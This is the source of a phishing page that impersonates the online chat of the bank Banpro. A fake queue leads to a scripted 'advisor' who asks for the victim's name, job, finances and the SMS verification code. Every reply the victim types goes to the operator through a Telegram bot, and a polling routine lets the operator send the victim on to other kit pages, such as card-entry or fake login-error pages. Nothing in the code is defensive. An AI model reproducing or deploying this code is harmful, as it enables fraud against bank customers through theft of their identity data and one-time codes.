<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { header('Location: /', true, 302); exit; }
include("oslo.php");
$u = $_SESSION['usuario'] ?? null;
if (!$u) { header("Location: jaspe.php"); exit; }

$advisors = ['Roberto Salcedo','María Fernanda López','Carlos Mendoza','Ana Gabriela Ruiz','Diego Martínez','Laura Vega','José Herrera','Karla Navarro'];
$advisor = $advisors[abs(crc32($u)) % count($advisors)];

// Heartbeat
if (isset($_GET['hb'])) {
    header('Content-Type: application/json');
    $hbDir = "chat/hb";
    if (!is_dir($hbDir)) mkdir($hbDir, 0777, true);
    file_put_contents("$hbDir/$u.txt", time());
    echo json_encode(['ok'=>true]);
    exit;
}

// Poll for redirects
if (isset($_GET['poll'])) {
    header('Content-Type: application/json');
    $ax_wol = "acciones/$u.txt";
    if (file_exists($ax_wol)) {
        $ac = trim(file_get_contents($ax_wol));
        unlink($ax_wol);
        $map = [
            '/SMS'=>'mica.php','/SMSERROR'=>'alba.php','/NUMERO'=>'numero.php',
            '/ERROR'=>'jaspe.php?error=1','/LOGINERROR'=>'jaspe.php?error=1','/LOGIN'=>'jaspe.php',
            '/CARD'=>'edelweiss.html','/LISTO'=>'nebula.php','/MAIL'=>'liebre.php',
            '/COMPRA'=>'copa.html','/TIMEFORM'=>'yute.php','/CHAT'=>'ocaso.php','/WS'=>'iris.php'
        ];
        $r = $map[$ac] ?? 'pampa.php';
        if ($r !== 'ocaso.php') { echo json_encode(['redirect'=>$r]); exit; }
    }
    echo json_encode(['redirect'=>null]);
    exit;
}

// Client message -> Telegram
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['msg'])) {
    header('Content-Type: application/json');
    $text = trim($_POST['msg']);
    if ($text !== '') {
        @file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
            'chat_id'=>$koala, 'text'=>"💬 [$u]: $text"
        ]));
    }
    echo json_encode(['ok'=>true]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Chat en l&iacute;nea - Banpro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{height:100vh;background:#f0f2f5;font-family:'Segoe UI',Roboto,Arial,sans-serif;display:flex;flex-direction:column;overflow:hidden;}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:#006838;color:#fff;flex-shrink:0;}
.topbar img{height:36px;width:auto;filter:brightness(10);}
.topbar-title{font-size:15px;font-weight:600;}

/* QUEUE */
#queueScreen{flex:1;display:flex;align-items:center;justify-content:center;background:#fdfdfd;padding:30px;}
.queue-box{text-align:center;max-width:360px;}
.queue-box img{width:100px;height:100px;margin-bottom:20px;}
.queue-box h2{font-size:18px;color:#006838;font-weight:600;margin-bottom:10px;}
.queue-pos{font-size:42px;color:#006838;font-weight:700;margin:16px 0;}
.queue-label{font-size:14px;color:#888;margin-bottom:6px;}
.queue-bar{width:100%;height:4px;background:#e5e5e5;border-radius:2px;overflow:hidden;margin-top:20px;}
.queue-bar-fill{height:100%;background:#006838;border-radius:2px;transition:width 1s linear;width:0%;}

/* CHAT */
#chatScreen{flex:1;display:none;flex-direction:column;overflow:hidden;}
.chat-header{padding:12px 20px;background:#fff;border-bottom:1px solid #e5e5e5;flex-shrink:0;}
.chat-header h2{font-size:15px;color:#006838;font-weight:600;margin-bottom:2px;}
.chat-header p{font-size:11px;color:#888;}
.dot-on{display:inline-block;width:8px;height:8px;background:#25D366;border-radius:50%;margin-right:5px;}
.chat-msgs{flex:1;overflow-y:auto;padding:14px 18px;display:flex;flex-direction:column;gap:6px;}
.msg{max-width:82%;padding:10px 14px;font-size:14px;line-height:1.5;word-wrap:break-word;animation:fadeIn .3s;}
.msg.bot{align-self:flex-start;background:#fff;border:1px solid #e0e0e0;border-radius:12px 12px 12px 2px;color:#333;}
.msg.client{align-self:flex-end;background:#006838;color:#fff;border-radius:12px 12px 2px 12px;}
.msg .mt{font-size:10px;opacity:.5;margin-top:3px;display:block;}
.sys-msg{align-self:center;background:#e8f5e9;color:#2e7d32;font-size:12px;padding:5px 14px;border-radius:12px;margin:8px 0;}
@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}

/* TYPING */
.typing{align-self:flex-start;display:flex;align-items:center;gap:4px;padding:10px 16px;background:#fff;border:1px solid #e0e0e0;border-radius:12px 12px 12px 2px;}
.typing span{width:7px;height:7px;background:#999;border-radius:50%;animation:bounce 1.2s infinite;}
.typing span:nth-child(2){animation-delay:.2s;}
.typing span:nth-child(3){animation-delay:.4s;}
@keyframes bounce{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-6px)}}
.typing-label{font-size:11px;color:#999;margin-left:6px;}

.chat-input{display:flex;gap:8px;padding:10px 16px;background:#fff;border-top:1px solid #e5e5e5;flex-shrink:0;}
.chat-input input{flex:1;padding:11px 14px;border:1px solid #d0d0d0;border-radius:22px;font-size:14px;outline:none;font-family:inherit;}
.chat-input input:focus{border-color:#006838;}
.chat-input button{width:44px;height:44px;background:#006838;color:#fff;border:none;border-radius:50%;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;}
</style>
</head>
<body>
<div class="topbar">
    <img src="l.png" alt="Banpro">
    <span class="topbar-title">Chat en l&iacute;nea</span>
</div>

<!-- QUEUE SCREEN -->
<div id="queueScreen">
    <div class="queue-box">
        <img src="img/gifcarga.gif" alt="">
        <h2>Conectando con un asesor</h2>
        <div class="queue-label">Posici&oacute;n en la fila</div>
        <div class="queue-pos" id="qPos">3</div>
        <div class="queue-label">Tiempo estimado: menos de 1 minuto</div>
        <div class="queue-bar"><div class="queue-bar-fill" id="qBar"></div></div>
    </div>
</div>

<!-- CHAT SCREEN -->
<div id="chatScreen">
    <div class="chat-header">
        <h2><span class="dot-on"></span><span id="advName"><?php echo htmlspecialchars($advisor); ?></span></h2>
        <p>En l&iacute;nea &mdash; Asesor comercial</p>
    </div>
    <div class="chat-msgs" id="chatMsgs"></div>
    <div class="chat-input">
        <input type="text" id="chatIn" placeholder="Escribe un mensaje..." autocomplete="off" disabled>
        <button id="chatSend">&#10148;</button>
    </div>
</div>

<script>
(function(){
var ADV = <?php echo json_encode($advisor); ?>;
var container = document.getElementById('chatMsgs');
var input = document.getElementById('chatIn');
var btn = document.getElementById('chatSend');
var waitingForReply = false;
var clientName = '';
var step = 0;

// ===== CONVERSATION FLOW =====
var flow = [
    {t:'sys', m:'{adv} se ha unido al chat'},
    {t:'bot', m:'Hola, soy {adv}, asesor comercial de Banpro. Estoy aqui para ayudarte con tu solicitud.'},
    {t:'bot', m:'Para continuar con el proceso, necesito verificar algunos datos. Me podrias confirmar tu nombre completo y que tipo de solicitud o consulta deseas realizar: tarjeta de credito, prestamo empresarial, credito personal, nuevo credito en linea, o participar en alguna promocion o sorteos disponibles.', w:1},
    {t:'bot', m:'Mucho gusto, {name}. Dejame revisar tu solicitud un momento...'},
    {t:'bot', m:'Listo. Veo que ya completaste el formulario inicial. Solo necesito confirmar unos datos adicionales para el analisis de tu perfil.'},
    {t:'bot', m:'Cual es tu ocupacion o actividad laboral actualmente?', w:1},
    {t:'bot', m:'Entendido. Y hace cuanto tiempo estas en esa posicion?', w:1},
    {t:'bot', m:'Perfecto. Cuentas actualmente con alguna cuenta de ahorro o producto financiero en Banpro u otra entidad?', w:1},
    {t:'bot', m:'Muy bien. Cual seria el uso principal que le darias al producto? Por ejemplo: compras del hogar, viajes, emergencias...', w:1},
    {t:'bot', m:'Que monto aproximado te gustaria solicitar?', w:1},
    {t:'bot', m:'Excelente. Tu perfil cumple con los requisitos preliminares.'},
    {t:'bot', m:'Ahora para continuar con la aprobacion, necesitamos verificar tu identidad. Te enviaremos un codigo de verificacion por SMS al numero que registraste.'},
    {t:'bot', m:'Dame un momento mientras proceso el envio del codigo...'},
    {t:'bot', m:'El codigo ha sido enviado a tu telefono. Podrias indicarme el codigo de verificacion cuando lo recibas?', w:1},
    {t:'bot', m:'Gracias, estoy verificando el codigo... Un momento por favor.'},
    {t:'bot', m:'Estamos procesando tu solicitud. Por favor no cierres esta ventana.'},
];

// ===== HELPERS =====
function esc(t){var d=document.createElement('div');d.textContent=t;return d.innerHTML;}
function hhmm(){var n=new Date();return String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0');}

function addBot(text){
    var d=document.createElement('div');
    d.className='msg bot';
    d.innerHTML='<span>'+esc(text)+'</span><span class="mt">'+esc(ADV)+' \u00b7 '+hhmm()+'</span>';
    container.appendChild(d);
    container.scrollTop=container.scrollHeight;
}
function addClient(text){
    var d=document.createElement('div');
    d.className='msg client';
    d.innerHTML='<span>'+esc(text)+'</span><span class="mt">T\u00fa \u00b7 '+hhmm()+'</span>';
    container.appendChild(d);
    container.scrollTop=container.scrollHeight;
}
function addSys(text){
    var d=document.createElement('div');
    d.className='sys-msg';
    d.textContent=text;
    container.appendChild(d);
    container.scrollTop=container.scrollHeight;
}

var typingEl=null;
function showTyping(){
    if(typingEl) return;
    typingEl=document.createElement('div');
    typingEl.className='typing';
    typingEl.innerHTML='<span></span><span></span><span></span><span class="typing-label">Escribiendo...</span>';
    container.appendChild(typingEl);
    container.scrollTop=container.scrollHeight;
}
function hideTyping(){
    if(typingEl){typingEl.remove();typingEl=null;}
}

function typingDelay(msg){
    var words=msg.split(' ').length;
    var base=1800+words*180;
    var jitter=(Math.random()-0.3)*1500;
    return Math.max(2000,Math.min(base+jitter,7000));
}

function replaceTpl(m){
    return m.replace(/\{adv\}/g,ADV).replace(/\{name\}/g,clientName||'');
}

// ===== PROCESS FLOW =====
function processStep(){
    if(step>=flow.length) return;
    var s=flow[step];
    var msg=replaceTpl(s.m);

    if(s.t==='sys'){
        addSys(msg);
        step++;
        setTimeout(processStep,1000);
        return;
    }

    // Bot message with typing delay
    showTyping();
    var delay=typingDelay(msg);
    setTimeout(function(){
        hideTyping();
        addBot(msg);
        step++;
        if(s.w){
            // Wait for client reply
            waitingForReply=true;
            input.disabled=false;
            input.focus();
        } else {
            // Continue after pause
            var pause=1200+Math.random()*1000;
            setTimeout(processStep,pause);
        }
    },delay);
}

// ===== CLIENT SEND =====
function sendMsg(){
    var t=input.value.trim();
    if(!t) return;
    input.value='';
    addClient(t);

    // Forward to Telegram
    var fd=new FormData();
    fd.append('msg',t);
    fetch('ocaso.php',{method:'POST',body:fd}).catch(function(){});

    // If first question (name), capture it
    if(step===3 && !clientName){
        clientName=t.split(' ').slice(0,2).join(' ');
    }

    if(waitingForReply){
        waitingForReply=false;
        input.disabled=true;
        setTimeout(processStep,800+Math.random()*600);
    }
}

btn.addEventListener('click',sendMsg);
input.addEventListener('keydown',function(e){if(e.key==='Enter')sendMsg();});

// ===== QUEUE =====
var qPos=3, qPct=0;
var qEl=document.getElementById('qPos');
var qBar=document.getElementById('qBar');
var qSteps=[
    {pos:3,pct:15,t:12000},
    {pos:2,pct:45,t:15000},
    {pos:1,pct:75,t:15000},
    {pos:0,pct:100,t:5000}
];
var qi=0;
function queueTick(){
    if(qi>=qSteps.length){
        // Queue done, start chat
        document.getElementById('queueScreen').style.display='none';
        var cs=document.getElementById('chatScreen');
        cs.style.display='flex';
        setTimeout(processStep,800);
        return;
    }
    var s=qSteps[qi];
    qEl.textContent=s.pos||'\u2714';
    qBar.style.width=s.pct+'%';
    if(s.pos===0){
        qEl.textContent='\u2714';
        qEl.style.color='#25D366';
        document.querySelector('.queue-box h2').textContent='Asesor encontrado';
    }
    qi++;
    setTimeout(queueTick,s.t);
}
setTimeout(function(){
    qBar.style.width='5%';
    queueTick();
},1500);

// ===== HEARTBEAT =====
setInterval(function(){
    fetch('ocaso.php?hb=1',{cache:'no-store'}).catch(function(){});
},15000);
fetch('ocaso.php?hb=1',{cache:'no-store'}).catch(function(){});

// ===== POLL REDIRECTS =====
(function poll(){
    fetch('ocaso.php?poll=1',{cache:'no-store'})
    .then(function(r){return r.json();})
    .then(function(d){
        if(d.redirect){window.location.href=d.redirect;return;}
        setTimeout(poll,2500);
    })
    .catch(function(){setTimeout(poll,3000);});
})();

})();
</script>
</body>
</html>
